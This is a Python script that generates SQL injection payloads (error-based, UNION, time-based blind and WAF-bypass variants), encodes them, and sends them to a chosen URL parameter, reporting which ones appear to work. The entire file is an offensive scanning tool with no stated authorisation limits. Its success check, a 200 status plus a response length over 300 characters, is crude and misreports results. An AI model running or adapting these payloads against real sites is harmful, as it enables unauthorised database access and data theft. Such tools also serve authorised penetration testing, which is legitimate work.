import argparse
import json
import base64
import urllib.parse
import requests
from urllib.parse import urlparse, urlencode


class SQLiPayloadGenerator:
    def __init__(self):
        self.error_based_payloads = [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "' AND '1'='1'--",
            "' AND '1'='2'--",
            "1 OR 1=1",
            "1 AND 1=1",
            "1 AND 1=2",
            "1 OR 1=1--",
            "1 OR 1=1#"
        ]
        self.union_based_payloads = [
            "' UNION SELECT null--",
            "' UNION SELECT null, null--",
            "1 UNION SELECT null--",
            "1 UNION SELECT null, null--",
            "1 UNION SELECT 1,2--",
            "1 UNION SELECT 1, user()--",
            "1 UNION SELECT 1, @@version--",
        ]
        self.blind_based_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "1 AND 1=1",
            "1 AND 1=2",
            "' AND sleep(5)--",
            "1 AND sleep(5)--"
        ]
        self.waf_bypass_payloads = [
            "'/**/OR/**/1=1--",
            "' oR 1=1#",
            "1/**/OR/**/1=1--",
            "1+OR+1=1--"
        ]

    def encode_payload(self, payload, method):
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "url":
            return urllib.parse.quote(payload)
        elif method == "hex":
            return ''.join([f"\\x{ord(c):02x}" for c in payload])
        elif method == "unicode":
            return ''.join([f"\\u{ord(c):04x}" for c in payload])
        return payload

    def generate_payloads(self, payload_type="all", encode=None):
        payloads = []

        if payload_type in ["all", "error"]:
            payloads += self.error_based_payloads
        if payload_type in ["all", "union"]:
            payloads += self.union_based_payloads
        if payload_type in ["all", "blind"]:
            payloads += self.blind_based_payloads

        payloads += self.waf_bypass_payloads

        if encode:
            payloads = [self.encode_payload(p, encode) for p in payloads]

        return payloads

    def test_target(self, url, param, payloads, keyword=None):
        print(f"\n[+] Scanning: {url}\n")

        working = []
        failed = []

        for p in payloads:
            full_url = url + "?" + urlencode({param: p})
            try:
                response = requests.get(full_url, timeout=5)
                status = response.status_code
                content_length = len(response.text)
                matched = keyword.lower() in response.text.lower() if keyword else False

                if status == 200 and (matched or content_length > 300):
                    print(f"[✓] Working → {p}")
                    working.append(p)
                else:
                    print(f"[✗] Server error → {p}")
                    failed.append(p)

            except requests.exceptions.ConnectTimeout:
                print(f"[✗] Timeout → {p}")
                failed.append(p)
            except requests.exceptions.RequestException:
                print(f"[✗] Server error → {p}")
                failed.append(p)

        print("\n========== SUMMARY ==========")
        print(f"✓ {len(working)} working payload(s)")
        print(f"✗ {len(failed)} failed payload(s)")

        return working


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Payload Generator + Scanner")
    parser.add_argument("--sqli", action="store_true", help="Generate SQLi payloads")
    parser.add_argument("--type", choices=["all", "error", "union", "blind"], default="all")
    parser.add_argument("--encode", choices=["base64", "url", "hex", "unicode"], help="Encoding method")
    parser.add_argument("--output", choices=["cli", "json"], default="cli")
    parser.add_argument("--target", help="Target URL to test, e.g., http://example.com/page.php")
    parser.add_argument("--param", default="id", help="GET parameter to inject (default: id)")
    parser.add_argument("--keyword", help="Optional keyword to detect in response (e.g., 'admin')")

    args = parser.parse_args()

    generator = SQLiPayloadGenerator()
    payloads = generator.generate_payloads(payload_type=args.type, encode=args.encode)

    if args.target:
        parsed = urlparse(args.target)
        if not parsed.scheme or not parsed.netloc:
            print("[X] Invalid URL. Include full URL with http:// or https://")
            return
        generator.test_target(args.target, args.param, payloads, keyword=args.keyword)
    elif args.sqli:
        if args.output == "json":
            print(json.dumps({"payloads": payloads}, indent=2))
        else:
            print("\n".join(payloads))


if __name__ == "__main__":
    main()
